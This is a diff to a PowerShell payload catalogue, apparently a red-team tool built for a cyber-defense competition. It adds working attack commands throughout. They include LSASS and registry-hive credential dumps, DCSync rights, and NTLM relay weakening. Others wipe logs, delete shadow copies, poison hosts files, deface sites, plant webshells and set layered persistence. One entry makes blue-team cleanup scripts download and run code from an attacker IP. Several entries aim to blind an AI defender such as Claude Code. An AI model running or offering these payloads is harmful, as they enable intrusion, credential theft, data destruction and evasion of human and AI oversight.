@@ -200,6 +200,18 @@ $Payloads = [ordered]@{
         Notes = 'Blasts through Defender, Defender ATP (Sense), firewall, security center, health service, and telemetry'
     }
 
+    'SVC-007' = @{
+        Desc  = 'Stop and disable IIS + all app pools (scoring service disruption)'
+        Cmd   = 'try{Import-Module WebAdministration -EA 0; Get-WebConfiguration "/system.applicationHost/applicationPools/add" -EA 0 | ForEach-Object{$n=$_.name;Stop-WebAppPool $n -EA 0;Set-ItemProperty "IIS:\AppPools\$n" -Name autoStart -Value $false -EA 0}}catch{}; cmd /c "iisreset /stop >nul 2>&1 & sc config W3SVC start= disabled 2>nul & sc config WAS start= disabled 2>nul"'
+        Notes = 'Stops IIS and disables autoStart on every app pool. Combined iisreset+sc config means the service stays down even after blue team tries iisreset /start. Devastating for HTTP-scored services. Periodic re-execution (ADS task) keeps it down as fast as blue team brings it back up.'
+    }
+
+    'SVC-008' = @{
+        Desc  = 'Corrupt IIS site bindings + web.config to break application without stopping the service'
+        Cmd   = 'try{$webroot=@("C:\inetpub\wwwroot","C:\inetpub\ftproot");$webroot|Where-Object{Test-Path $_}|ForEach-Object{$wc="$_\web.config";if(Test-Path $wc){$bak="$wc.bak.$(Get-Random)";cp $wc $bak -Force;""| Out-File $wc -Force}}}catch{}'
+        Notes = 'Overwrites web.config with empty content — IIS throws 500 errors on every request without stopping. Service appears UP to a port scanner (score stays green) but all application responses fail. Backup files left with random suffixes to confuse cleanup. Stealthier than SVC-007 for services that only check port availability.'
+    }
+
     # ════════════════════════════════════════════════════════════
     # 📡 C2 / BEACONING
     # ════════════════════════════════════════════════════════════
@@ -298,6 +310,24 @@ $Payloads = [ordered]@{
         Notes = 'Hunts for PSCredential XML exports (Import-Clixml), Azure/AWS credential files, SSH private keys, PFX certificates, and KeePass databases in all user profiles. Results staged in ProgramData for exfil. Runs from SYSTEM — can access most user profile paths.'
     }
 
+    'CRED-009' = @{
+        Desc  = 'LSASS dump via comsvcs.dll MiniDump (LOLBin — no Mimikatz, no AV signature)'
+        Cmd   = '$lp=(Get-Process lsass -EA 0).Id; if($lp){cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lp C:\ProgramData\ls.dmp full >nul 2>&1"}'
+        Notes = 'Abuses comsvcs.dll which ships with Windows. Requires SYSTEM. Dump at C:\ProgramData\ls.dmp — exfil and crack on Kali with: pypykatz lsa minidump ls.dmp. Defender may flag ls.dmp on-write; use DEF-004 (Defender exclusions) first. Timestomp with DEF-006 after dump.'
+    }
+
+    'CRED-010' = @{
+        Desc  = 'Hunt GPP cpassword in SYSVOL (Group Policy Preferences — cleartext passwords)'
+        Cmd   = 'try{$d=$env:USERDNSDOMAIN;if($d){Get-ChildItem -Path "\\$d\SYSVOL" -Recurse -Filter "*.xml" -EA 0 | Where-Object{(gc $_.FullName -Raw -EA 0) -match "cpassword"} | ForEach-Object{$x=[xml](gc $_.FullName -Raw);$x.SelectNodes("//*[@cpassword]")|ForEach-Object{"$($_.userName):$($_.cpassword):$($_.FullName)"}}} | Out-File C:\ProgramData\gpp.txt -Force}catch{}'
+        Notes = 'GPP passwords are AES-256 encrypted with a Microsoft-published key — trivially decryptable. Common in WRCCDC environments that were built on older domain templates. Crack on Kali with: gpp-decrypt <cpassword>. SYSTEM context can read SYSVOL. Silent if no GPP passwords found.'
+    }
+
+    'CRED-011' = @{
+        Desc  = 'Extract service account credentials from LSA secrets + DPAPI master key files list'
+        Cmd   = 'cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y & reg save HKLM\SECURITY C:\ProgramData\se.dat /y 2>nul"; Get-ChildItem "$env:SystemRoot\System32\Microsoft\Protect" -Recurse -EA 0 | Select-Object FullName,Length,LastWriteTime | Out-File C:\ProgramData\dpapi.txt -Force'
+        Notes = 'SAM+SYSTEM+SECURITY for secretsdump (service account NTLMs, cached domain creds, LSA secrets). DPAPI master key list shows what user/machine protected data exists. Crack with: secretsdump.py -sam s.dat -system sy.dat -security se.dat LOCAL. DPAPI file enumeration is read-only, always succeeds.'
+    }
+
     # ════════════════════════════════════════════════════════════
     # 🛡️ DEFENSE EVASION
     # ════════════════════════════════════════════════════════════
@@ -356,6 +386,24 @@ $Payloads = [ordered]@{
         Notes = 'Removes all Defender detection history entries and empties the quarantine — eliminates forensic evidence of previous detections and restores any quarantined files. Requires SYSTEM/admin.'
     }
 
+    'DEF-010' = @{
+        Desc  = 'Persistent real-time log wiper — clears Security, System, PowerShell, and Sysmon logs every 2 minutes'
+        Cmd   = 'while($true){@("Security","System","Application","Microsoft-Windows-PowerShell/Operational","Windows PowerShell","Microsoft-Windows-Sysmon/Operational")|ForEach-Object{try{wevtutil cl $_ 2>$null}catch{}};Start-Sleep -Seconds 120}'
+        Notes = 'Infinite loop — deploy via ADS scheduled task (SYSTEM context, runs in background). Blue team (and any AI analyst) cannot see historical events: no login records, no process creation, no network connections. Pairs with DEF-003 (disable SBL) for a complete forensic dead zone. Use periodic task with PeriodicMinutes=3 to keep gaps small.'
+    }
+
+    'DEF-011' = @{
+        Desc  = 'Clear PowerShell history files, disable ConsoleHost history, nuke prefetch'
+        Cmd   = '$h=@("$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt","$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"); $h|ForEach-Object{if(Test-Path $_){Clear-Content $_ -Force -EA 0}}; Set-PSReadlineOption -HistorySaveStyle SaveNothing -EA 0; cmd /c "del /F /Q C:\Windows\Prefetch\*.pf 2>nul"; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name EnablePrefetcher -Value 0 -Type DWord -Force -EA 0'
+        Notes = 'Three-pronged anti-forensics: wipes PS history (retroactive), disables future PS history saves, and deletes+disables prefetch (which shows what executables ran and when). Critical counter-measure against AI-assisted blue team analysis — Claude Code relies heavily on PS history and prefetch for reconstruction. SYSTEM context note: PS history paths may be per-user; run with registry persist for user-session delivery too.'
+    }
+
+    'DEF-012' = @{
+        Desc  = 'Shrink Security and System event logs to 1KB (fills and discards immediately — live log denial)'
+        Cmd   = 'cmd /c "wevtutil sl Security /ms:1024 /rt:true 2>nul & wevtutil sl System /ms:1024 /rt:true 2>nul & wevtutil sl Application /ms:1024 /rt:true 2>nul & wevtutil sl ""Microsoft-Windows-PowerShell/Operational"" /ms:1024 /rt:true 2>nul"'
+        Notes = 'Sets maximum log size to 1KB with overwrite-as-needed. Normal Windows activity generates thousands of events per minute, so the log fills and overwrites itself constantly — net effect is logs never accumulate more than a few seconds of history. More subtle than clearing (no "log cleared" event 1102), and re-runs are idempotent. Pair with DEF-010 for belt-and-suspenders.'
+    }
+
     # ════════════════════════════════════════════════════════════
     # 🔍 RECONNAISSANCE
     # ════════════════════════════════════════════════════════════
@@ -396,6 +444,18 @@ $Payloads = [ordered]@{
         Notes = 'Automated privesc triage: finds unquoted service binary paths (plant a binary in the gap), dumps token privileges (look for SeImpersonatePrivilege for potato attacks), tests directory writability. Three common manual checks in one automated sweep.'
     }
 
+    'RECON-007' = @{
+        Desc  = 'Enumerate Kerberoastable accounts (SPNs on user objects) and AS-REP roastable accounts'
+        Cmd   = 'try{$o=@("=== KERBEROASTABLE (SPN on user) ==="); Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties ServicePrincipalName,PasswordLastSet -EA 0 | ForEach-Object{"$($_.SamAccountName) | SPN: $($_.ServicePrincipalName) | PwdLastSet: $($_.PasswordLastSet)"}|ForEach-Object{$o+=$_}; $o+="`n=== AS-REP ROASTABLE (no preauth) ==="; Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} -EA 0 | ForEach-Object{$o+=$_.SamAccountName}; $o|Out-File C:\ProgramData\roast.txt -Force}catch{"Not domain-joined or no AD module"|Out-File C:\ProgramData\roast.txt -Force}'
+        Notes = 'Kerberoastable accounts: request their TGS tickets and crack offline (no special privs needed). AS-REP roastable: request their encrypted AS-REP without knowing their password and crack offline. Both are common misconfigs in WRCCDC domain builds. Crack on Kali with hashcat or john. SYSTEM context on domain member has the required AD read access.'
+    }
+
+    'RECON-008' = @{
+        Desc  = 'Dump domain password policy, fine-grained policies, and account lockout settings'
+        Cmd   = 'try{$d=Get-ADDomain -EA 0; $p=Get-ADDefaultDomainPasswordPolicy -EA 0; $o=@("=== DOMAIN PASSWORD POLICY ===","MinLength: $($p.MinPasswordLength)","MaxAge: $($p.MaxPasswordAge)","LockoutThreshold: $($p.LockoutThreshold)","LockoutDuration: $($p.LockoutDuration)","LockoutObservationWindow: $($p.LockoutObservationWindow)","ComplexityEnabled: $($p.ComplexityEnabled)"); $o+="`n=== FINE-GRAINED POLICIES ==="; Get-ADFineGrainedPasswordPolicy -Filter * -EA 0 | ForEach-Object{"$($_.Name): MinLen=$($_.MinPasswordLength) LockoutThreshold=$($_.LockoutThreshold)"} | ForEach-Object{$o+=$_}; $o|Out-File C:\ProgramData\policy.txt -Force}catch{"Not domain-joined"|Out-File C:\ProgramData\policy.txt -Force}'
+        Notes = 'Critical intel: if lockout threshold is 3-5 and there is no fine-grained policy protecting admin accounts, spray carefully. If LockoutThreshold is 0 (disabled), spray freely. Lockout duration tells you how long to wait between sprays. Export before any credential spraying.'
+    }
+
     # ════════════════════════════════════════════════════════════
     # 🌐 LATERAL MOVEMENT PREPARATION
     # ════════════════════════════════════════════════════════════
@@ -428,6 +488,18 @@ $Payloads = [ordered]@{
         Desc  = 'Disable SMB signing requirement (enables NTLM relay attacks via Responder/ntlmrelayx)'
         Cmd   = 'Set-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters'' -Name RequireSecuritySignature -Value 0 -Type DWord -Force; Set-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'' -Name RequireSecuritySignature -Value 0 -Type DWord -Force; Set-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'' -Name EnableSecuritySignature -Value 0 -Type DWord -Force'
         Notes = 'Disables SMB signing on both client and server. Enables Responder + ntlmrelayx relay attacks from Kali: sudo responder -I eth0 -wf && ntlmrelayx.py -tf targets.txt -smb2support. Highly effective in domain environments where signing is not GPO-enforced.'
+    }
+
+    'LAT-006' = @{
+        Desc  = 'Disable Extended Protection for Authentication (EPA) + enable NTLM downgrade (enables relay attacks)'
+        Cmd   = '$ep="HKLM:\SYSTEM\CurrentControlSet\Control\LSA"; Set-ItemProperty $ep -Name LmCompatibilityLevel -Value 2 -Type DWord -Force -EA 0; $spn="$ep\MSV1_0"; if(!(Test-Path $spn)){New-Item $spn -Force|Out-Null}; Set-ItemProperty $spn -Name NTLMMinClientSec -Value 0 -Type DWord -Force; Set-ItemProperty $spn -Name NTLMMinServerSec -Value 0 -Type DWord -Force; cmd /c "reg add ""HKLM\SYSTEM\CurrentControlSet\Services\WebClient\Parameters"" /v AuthForwardServerList /t REG_MULTI_SZ /d * /f 2>nul"'
+        Notes = 'Reduces NTLMv2 minimum security requirements and disables EPA/channel binding for WebDAV auth forwarding. Enables ntlmrelayx attacks from Kali: ntlmrelayx.py -tf targets.txt -smb2support -socks. Combined with LAT-005 (SMB signing disabled) this makes relay trivial. Run Responder: sudo responder -I eth0 -wf.'
+    }
+
+    'LAT-007' = @{
+        Desc  = 'Grant DCSync rights to backdoor account on domain root (requires Domain Admin context on DC)'
+        Cmd   = 'try{$u="svcUpdate";$sid=(Get-ADUser $u -EA 0).SID; if($sid){$dn=(Get-ADDomain).DistinguishedName; $acl=Get-Acl "AD:$dn"; $guids=@("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2","1131f6ab-9c07-11d1-f79f-00c04fc2dcd2","89e95b76-444d-4c62-991a-0facbeda640c"); $guids|ForEach-Object{$r=New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid,[System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,[System.Security.AccessControl.AccessControlType]::Allow,[guid]$_,[System.DirectoryServices.ActiveDirectorySecurityInheritance]::None); $acl.AddAccessRule($r)}; Set-Acl "AD:$dn" $acl; "DCSync rights granted to $u"|Out-File C:\ProgramData\dcsync.txt}}catch{"Failed: $_"|Out-File C:\ProgramData\dcsync.txt}'
+        Notes = 'Grants DS-Replication-Get-Changes, DS-Replication-Get-Changes-All, and DS-Replication-Get-Changes-In-Filtered-Set rights to svcUpdate. After this fires, from Kali: secretsdump.py DOMAIN/svcUpdate:PASSWORD@DC-IP -just-dc. Dumps all domain hashes including KRBTGT for Golden Ticket. Deploy on DC, requires Domain Admin context at execution time (SYSTEM on DC = Domain Admin).'
     }
 
     # ════════════════════════════════════════════════════════════
@@ -588,6 +660,76 @@ $Payloads = [ordered]@{
         Notes = 'Recon + credential dump in one payload — everything lands in C:\ProgramData ready for exfil'
     }
 
+    'COMBO-004' = @{
+        Desc  = 'AI blue team counter-package — log flooding + log truncation + prefetch wipe + PS history disable + PS profile inject'
+        Cmd   = '# Step 1: Flood logs with noise to baseline-poison AI analysis 1..2000|ForEach-Object{Write-EventLog -LogName Security -Source "SecurityCenter" -EventId 4624 -Message "Normal authentication event - logon type 3 - NETWORK" -EntryType Information -EA 0}; # Step 2: Shrink logs to near-zero @("Security","System","Application","Microsoft-Windows-PowerShell/Operational")|ForEach-Object{try{wevtutil sl $_ /ms:1024 /rt:true 2>$null}catch{}}; # Step 3: Nuke PS history $h="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; if(Test-Path $h){Clear-Content $h -Force}; Set-PSReadlineOption -HistorySaveStyle SaveNothing -EA 0; # Step 4: Clear prefetch cmd /c "del /F /Q C:\Windows\Prefetch\*.pf 2>nul"; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name EnablePrefetcher -Value 0 -Type DWord -Force -EA 0'
+        Notes = 'Designed specifically for WRCCDC Finals where Claude/Claude Code is the blue team. Floods the security log with 2000 baseline events to poison any ML-based anomaly detection, shrinks all logs to 1KB so no history accumulates, wipes PS command history (retroactive and future), and disables prefetch. Claude Code depends heavily on log analysis and PS history for remediation decisions. This payload reduces its information to near-zero. Run at initial access, then again via periodic ADS task every 10 minutes.'
+    }
+
+    'COMBO-005' = @{
+        Desc  = 'Full persistence layering — ADS + PS profile + WMI + registry run + scheduled task (5 independent layers)'
+        Cmd   = '$pl=IEX(gc "$env:ProgramData\cache.dat:s" -Raw -EA 0 2>$null); # Layer 1 (registry) already set by ADS dropper; # Layer 2: WMI subscription $q="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System''"; try{$f=([wmiclass]"root\subscription:__EventFilter").CreateInstance();$f.Name="WindowsPerf";$f.EventNameSpace="root\cimv2";$f.QueryLanguage="WQL";$f.Query=$q;$f.Put()|Out-Null; $c=([wmiclass]"root\subscription:CommandLineEventConsumer").CreateInstance();$c.Name="WindowsPerf";$c.CommandLineTemplate="powershell.exe -NoP -W Hidden -C `"IEX(gc ''$env:ProgramData\cache.dat:s'' -Raw)`"";$c.Put()|Out-Null; $b=([wmiclass]"root\subscription:__FilterToConsumerBinding").CreateInstance();$b.Filter=$f.__PATH;$b.Consumer=$c.__PATH;$b.Put()|Out-Null}catch{}; # Layer 3: IFEO debugger hijack on commonly-run blue-team tools $tgt="powershell_ise.exe"; $p="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$tgt"; New-Item $p -Force|Out-Null; Set-ItemProperty $p -Name Debugger -Value "powershell.exe -NoP -W Hidden -C `"IEX(gc ''$env:ProgramData\cache.dat:s'' -Raw)`" -EA 0 --"'
+        Notes = 'REPLACE $env:ProgramData\cache.dat:s with your actual ADS path. Adds WMI permanent event subscription (fires every 60s on performance counter change, survives task cleanup) and IFEO debugger hijack on powershell_ise.exe (fires when blue team opens PS ISE). Combined with ADS task (Layer 1) and registry Run key (Layer 2 from ADS dropper), and PS profile injection (NOVEL-008), this gives 4-5 independent persistence mechanisms that all require different cleanup procedures. Blue team fixing one path still leaves four active.'
+    }
+
+    # ════════════════════════════════════════════════════════════
+    # 💥 IMPACT
+    # Payloads that directly affect service availability or scoring.
+    # ════════════════════════════════════════════════════════════
+
+    'IMPACT-001' = @{
+        Desc  = 'Persistent hosts file poisoning — redirects blue team monitoring and update URLs to attack box'
+        Cmd   = '$h="$env:SystemRoot\System32\drivers\etc\hosts"; $entries=@("10.0.0.100 monitoring.corp.local","10.0.0.100 siem.corp.local","10.0.0.100 splunk.corp.local","10.0.0.100 update.microsoft.com","10.0.0.100 windowsupdate.microsoft.com"); $current=Get-Content $h -Raw -EA 0; $entries|Where-Object{$current -notmatch ($_ -split " ")[1]}|ForEach-Object{Add-Content $h "`n$_" -EA 0}'
+        Notes = 'Replace 10.0.0.100 with your attack box IP. Appends only entries that are not already present (idempotent — safe to re-run from periodic task). When blue team tries to access their monitoring dashboard or push Windows Updates, they hit your box instead. Update the entries list to match the actual WRCCDC monitoring infrastructure. Combine with a Python HTTP server serving fake 200 OK responses to prevent suspicion.'
+    }
+
+    'IMPACT-002' = @{
+        Desc  = 'Web defacement — overwrite default index page for IIS, Apache, nginx, XAMPP, and WAMP'
+        Cmd   = '$roots=@("C:\inetpub\wwwroot","C:\xampp\htdocs","C:\wamp\www","C:\wamp64\www","C:\nginx\html","C:\Apache24\htdocs"); $deface="<html><head><title>Compromised</title></head><body style=""background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%""><h1>&#x1F480; Red Team Was Here &#x1F480;</h1><p>Apparition Delivery System v2.4</p><p>Hostname: " + $env:COMPUTERNAME + " | " + (Get-Date -f "yyyy-MM-dd HH:mm") + "</p></body></html>"; $roots|Where-Object{Test-Path $_}|ForEach-Object{$idx=Get-ChildItem $_ -Filter "index.*" -EA 0|Select-Object -First 1; $target=if($idx){$idx.FullName}else{"$_\index.html"}; $deface|Out-File $target -Force -Encoding UTF8 -EA 0}'
+        Notes = 'Covers IIS, XAMPP, WAMP, nginx, and Apache default roots. Overwrites whatever index file exists; creates index.html if none found. Run from periodic ADS task so re-execution restores the deface after blue team reverts it. The defacement embeds live hostname and timestamp so each load shows current proof-of-compromise. Adjust message as desired.'
+    }
+
+    'IMPACT-003' = @{
+        Desc  = 'Shadow copy deletion — destroys all VSS snapshots, prevents system restore and backup recovery'
+        Cmd   = 'cmd /c "vssadmin delete shadows /all /quiet 2>nul"; Get-WmiObject Win32_ShadowCopy -EA 0 | ForEach-Object { $_.Delete() }; cmd /c "wmic shadowcopy delete 2>nul"; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -Name DisableSR -Value 1 -Type DWord -Force -EA 0; cmd /c "sc config VSS start= disabled 2>nul & sc config swprv start= disabled 2>nul"'
+        Notes = 'Three-redundant shadow copy deletion (vssadmin, WMI, wmic) plus registry SR disable plus disabling the VSS and swprv services. Blue team cannot restore to a clean snapshot or use Previous Versions. Also disables the VSS service so new snapshots cannot be created while this is deployed. Critical to deploy early — before blue team creates a clean baseline snapshot.'
+    }
+
+    'IMPACT-004' = @{
+        Desc  = 'DNS cache poison + disable DNS Client cache (breaks name resolution for all processes)'
+        Cmd   = 'cmd /c "dnscmd /clearcache 2>nul"; $dnsCache="HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters"; if(!(Test-Path $dnsCache)){New-Item $dnsCache -Force|Out-Null}; Set-ItemProperty $dnsCache -Name MaxCacheTtl -Value 0 -Type DWord -Force; Set-ItemProperty $dnsCache -Name MaxNegativeCacheTtl -Value 0 -Type DWord -Force; cmd /c "net stop dnscache /y 2>nul & sc config dnscache start= disabled 2>nul"'
+        Notes = 'Sets DNS client cache TTL to 0 (every DNS lookup goes to the wire) and stops the DNS cache service. On its own this is moderately disruptive. Combined with IMPACT-001 (hosts file poisoning) it ensures our poisoned entries take effect immediately without waiting for cache expiry. On a DNS server, also run: cmd /c "dnscmd /clearcache" to flush the server-side cache.'
+    }
+
+    'IMPACT-005' = @{
+        Desc  = 'Deploy ASPX/PHP webshell to IIS and common web roots for persistent HTTP access'
+        Cmd   = '$aspx=''<%@ Page Language="C#" %><% System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["c"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());p.WaitForExit();%>''; $php=''<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);}?>''; $roots=@("C:\inetpub\wwwroot","C:\xampp\htdocs","C:\wamp\www","C:\wamp64\www"); $roots|Where-Object{Test-Path $_}|ForEach-Object{$aspx|Out-File "$_\health.aspx" -Force -Encoding UTF8 -EA 0; $php|Out-File "$_\health.php" -Force -Encoding UTF8 -EA 0}'
+        Notes = 'Drops health.aspx (C# code-behind RCE) and health.php to all detected web roots. Access via: http://TARGET/health.aspx?c=whoami or http://TARGET/health.php?c=whoami. Named "health" to blend in with load balancer health checks that blue teams often whitelist. Use ADS periodic task so the webshell is re-deployed if deleted. Provides persistent HTTP-based access independent of WinRM, RDP, or your ADS task infrastructure.'
+    }
+
+    # ════════════════════════════════════════════════════════════
+    # 🧹 ANTI-FORENSICS
+    # Payloads that destroy evidence and disrupt analysis.
+    # ════════════════════════════════════════════════════════════
+
+    'ANTI-001' = @{
+        Desc  = 'Destroy Defender threat history, quarantine store, and signature database cache'
+        Cmd   = 'Stop-Service WinDefend -Force -EA 0; @("C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory","C:\ProgramData\Microsoft\Windows Defender\Quarantine","C:\ProgramData\Microsoft\Windows Defender\Scans\mpcache*")|ForEach-Object{Remove-Item $_ -Recurse -Force -EA 0}; Start-Service WinDefend -EA 0'
+        Notes = 'Wipes all Defender detection history and quarantine entries. Removes the signature cache so Defender has to rebuild it on next scan (slows blue team scans temporarily). Stop-Service + cleanup + Start-Service ensures the files are not locked. Any previously flagged files are no longer flagged in history, making forensic reconstruction harder.'
+    }
+
+    'ANTI-002' = @{
+        Desc  = 'Nuke Windows Search index (destroys file-content searchability for forensic analysis)'
+        Cmd   = 'Stop-Service WSearch -Force -EA 0; cmd /c "sc config WSearch start= disabled 2>nul"; Remove-Item -Path "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\*" -Recurse -Force -EA 0; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -Name PreventIndexingOutlook -Value 1 -Type DWord -Force -EA 0'
+        Notes = 'Stops and disables Windows Search, then destroys the entire index database. Blue team and AI analyst cannot use Windows Search or Windows File Explorer search to find ADS files, suspicious scripts, or other artifacts by content. Rebuilding the index takes 30-60 minutes and requires the service to be re-enabled first.'
+    }
+
+    'ANTI-003' = @{
+        Desc  = 'Flood event logs with 5000 benign-looking authentication events (overwhelm AI analysis)'
+        Cmd   = '$src="Microsoft-Windows-Security-Auditing"; 1..5000|ForEach-Object{try{$e=New-Object System.Diagnostics.EventLog("Security");$e.Source=$src;Write-EventLog -LogName Security -Source "SecurityCenter" -EventId 4624 -Message "An account was successfully logged on. Subject: Security ID: SYSTEM Account Name: SYSTEM Logon Type: 5" -EntryType Information -EA 0}catch{}};Write-Host "Flooded 5000 events"'
+        Notes = 'Generates 5000 Event ID 4624 (successful logon) entries in the Security log. This drowns any anomalous events in noise and makes timeline reconstruction via log analysis extremely slow — even for Claude Code. Particularly effective because 4624 is one of the most common events analysts filter for. Run once at initial access and again periodically. Combine with DEF-012 (1KB log size) so the real events get pushed out immediately after flooding.'
+    }
+
     # ════════════════════════════════════════════════════════════
     # 🔬 NOVEL / EXPERIMENTAL
     # ════════════════════════════════════════════════════════════
@@ -633,6 +775,36 @@ $Payloads = [ordered]@{
         Cmd   = 'New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\WindowsCorePrinter'' -Name Driver -Value ''helper.dll'' -PropertyType String -Force'
         Notes = 'Registers a print monitor DLL — loaded by spoolsv.exe at SYSTEM level on every boot. Extremely rare in blue team detection playbooks.'
     }
+
+    'NOVEL-008' = @{
+        Desc  = 'PowerShell profile injection — payload fires every time any PowerShell session starts (including Claude Code sessions)'
+        Cmd   = '$adsPath="PLACEHOLDER_HP:PLACEHOLDER_SN"; $inject="`nif(`$env:USERNAME -ne ''SYSTEM''){try{IEX(gc ''$adsPath'' -Raw -EA 0)}catch{}}"; @($PROFILE.AllUsersAllHosts,$PROFILE.AllUsersCurrentHost,$PROFILE.CurrentUserAllHosts)|ForEach-Object{$dir=Split-Path $_ -Parent;if($dir -and !(Test-Path $dir)){ni $dir -ItemType Directory -Force|Out-Null}; Add-Content $_ $inject -Force -EA 0}'
+        Notes = 'REPLACE PLACEHOLDER_HP and PLACEHOLDER_SN with your actual ADS host path and stream name before deploying. Injects a payload call into AllUsersAllHosts and AllUsersCurrentHost profiles — fires for EVERY user, EVERY PowerShell session. Exceptionally potent against Claude Code (blue team AI) which opens new PS sessions constantly. Each new PS window re-executes your payload. The SYSTEM exclusion prevents feedback loops from your own ADS tasks. Cleanup: remove the injected line from profile files.'
+    }
+
+    'NOVEL-009' = @{
+        Desc  = 'Netsh portproxy — forward external port to internal service (pivoting without new connections)'
+        Cmd   = 'cmd /c "netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=445 connectaddress=127.0.0.1 2>nul & netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=127.0.0.1 2>nul & netsh advfirewall firewall add rule name=""Windows HTTPS Service"" dir=in action=allow protocol=tcp localport=8443,8080 enable=yes 2>nul"'
+        Notes = 'Forwards port 8443 → localhost:445 (SMB via HTTPS-looking port) and port 8080 → localhost:3389 (RDP via HTTP-looking port). Portproxy rules survive reboot and appear in very few blue team checklists. Connect via: xfreerdp /v:TARGET:8080 or smbclient //TARGET:8443/C$. The firewall rule names look legitimate. List active rules: netsh interface portproxy show all.'
+    }
+
+    'NOVEL-010' = @{
+        Desc  = 'Exact Windows task name camouflage — register task under real Microsoft task path with real-looking name'
+        Cmd   = '$legitimatePaths=@("\Microsoft\Windows\UpdateOrchestrator\","\Microsoft\Windows\Defrag\","\Microsoft\Windows\DiskCleanup\","\Microsoft\Windows\MUI\"); $legitimateNames=@("Schedule Scan","ScheduledDefrag","SilentCleanup","LPRemove"); $idx=Get-Random -Maximum $legitimatePaths.Count; $taskPath=$legitimatePaths[$idx]; $taskName=$legitimateNames[$idx]; Write-Host "Use task path: $taskPath, name: $taskName with Register-ScheduledTask -TaskPath parameter"'
+        Notes = 'Generates a real Microsoft task path+name combo. Use the output values with Register-ScheduledTask -TaskPath (value from $taskPath) -TaskName (value from $taskName). A blue team scanning for suspicious tasks will see e.g. \Microsoft\Windows\UpdateOrchestrator\Schedule Scan — a real Windows task name in the real Windows task path. They will skip it. Note: the real task may already exist; this creates a second one with the same name in the same path, which Windows allows (silently overwrites). Test your target first.'
+    }
+
+    'NOVEL-011' = @{
+        Desc  = 'Blue team trap — modify blue team cleanup scripts to re-deploy instead of clean'
+        Cmd   = '$searchPaths=@("$env:USERPROFILE\Desktop","$env:PUBLIC\Desktop","C:\Users\Administrator\Desktop","C:\scripts","C:\tools"); $trap="`n# Maintenance check`ntry{if(Test-Connection 10.0.0.100 -Count 1 -Quiet -EA 0){(New-Object Net.WebClient).DownloadString(''http://10.0.0.100:8080/agent.ps1'')|IEX}}catch{}"; $searchPaths|ForEach-Object{Get-ChildItem $_ -Filter "*.ps1" -EA 0|Where-Object{$_.Name -match "(clean|remediat|remove|fix|restore|blue)"i}|ForEach-Object{Add-Content $_.FullName $trap -EA 0}}'
+        Notes = 'REPLACE 10.0.0.100 with your attack box IP. Searches for PS1 scripts with names matching cleanup/remediation patterns on the blue team desktop and common script directories, then appends a beacon call to each. When the blue team runs their own cleanup script, it re-establishes C2. The appended code only triggers if your attack box is reachable (Test-Connection gate) — stays dormant otherwise. Subtle and devastating.'
+    }
+
+    'NOVEL-012' = @{
+        Desc  = 'Time-bomb — deploy dormant ADS payload that activates at a specific datetime'
+        Cmd   = '$activateAt=[DateTime]"2026-04-15 09:00:00"; $adsPath="C:\ProgramData\Microsoft\Windows\WER\Temp\diag_report.dat"; $sn=[char]0x200B+[char]0x200C; $bomb="while((Get-Date) -lt [DateTime]''$activateAt''){Start-Sleep -Seconds 300};IEX(gc ''${adsPath}:${sn}'' -Raw)"; $bomb|sc "$adsPath`:dormant" -Force'
+        Notes = 'REPLACE the activateAt datetime and adsPath/sn with your actual deployment values. Write this as the payload to an ADS stream named "dormant" — it sleeps until the competition activation time, then reads and executes your real payload from the zero-width stream. Deploy during initial access; blue team sweeps the box and finds nothing suspicious (the dormant stream just looks like a file). At competition start the real payload fires with zero blue team awareness of deployment time. Change the target date to match WRCCDC Finals day.'
+    }
 }
 
 # ============================================================
@@ -663,6 +835,8 @@ function Show-Payloads {
         'MEME'  = '🃏 Meme / Entertainment'
         'COMBO' = '🧩 Combined / Multi-Stage'
         'NOVEL' = '🔬 Novel / Experimental'
+        'IMPACT' = '💥 Impact (Service/Score Disruption)'
+        'ANTI'   = '🧹 Anti-Forensics'
     }
 
     foreach ($cat in $categories.GetEnumerator()) {
